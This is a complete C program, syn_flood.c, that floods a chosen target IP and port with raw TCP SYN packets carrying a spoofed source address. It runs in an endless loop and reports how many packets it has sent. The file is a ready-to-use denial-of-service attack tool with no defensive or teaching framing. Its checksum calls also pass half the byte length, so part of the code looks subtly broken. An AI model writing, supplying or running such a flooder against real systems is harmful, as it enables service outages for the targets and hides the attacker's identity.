// syn_flood.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>

struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

struct packet {
    struct iphdr ip;
    struct tcphdr tcp;
};

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <source_ip> <target_ip> [port]\n", argv[0]);
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int target_port = (argc > 3) ? atoi(argv[3]) : 80;

    struct packet pkt;
    struct pseudo_header psh;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(argv[2]);

    printf("SYN Flooding %s:%d...\n", argv[2], target_port);

    unsigned long count = 0;
    while (1) {
        memset(&pkt, 0, sizeof(pkt));

        // IP Header
        pkt.ip.version = 4;
        pkt.ip.ihl = 5;
        pkt.ip.tot_len = htons(sizeof(pkt));
        pkt.ip.id = htons(rand());
        pkt.ip.ttl = 64;
        pkt.ip.protocol = IPPROTO_TCP;
        pkt.ip.saddr = inet_addr(argv[1]);
        pkt.ip.daddr = inet_addr(argv[2]);
        pkt.ip.check = 0;
        pkt.ip.check = checksum((unsigned short*)&pkt.ip, sizeof(struct iphdr)/2);

        // TCP Header
        pkt.tcp.source = htons(rand() % 65535);
        pkt.tcp.dest = htons(target_port);
        pkt.tcp.seq = htonl(rand());
        pkt.tcp.ack_seq = 0;
        pkt.tcp.doff = 5;
        pkt.tcp.syn = 1;
        pkt.tcp.window = htons(65535);
        pkt.tcp.check = 0;

        // Pseudo header for checksum
        psh.source_address = inet_addr(argv[1]);
        psh.dest_address = inet_addr(argv[2]);
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), &pkt.tcp, sizeof(struct tcphdr));
        pkt.tcp.check = checksum((unsigned short*)pseudogram, psize/2);
        free(pseudogram);

        sendto(sock, &pkt, sizeof(pkt), 0, (struct sockaddr*)&dest, sizeof(dest));
        
        count++;
        if (count % 100000 == 0) {
            printf("\r[+] SYN packets: %lu", count);
            fflush(stdout);
        }
    }

    return 0;
}
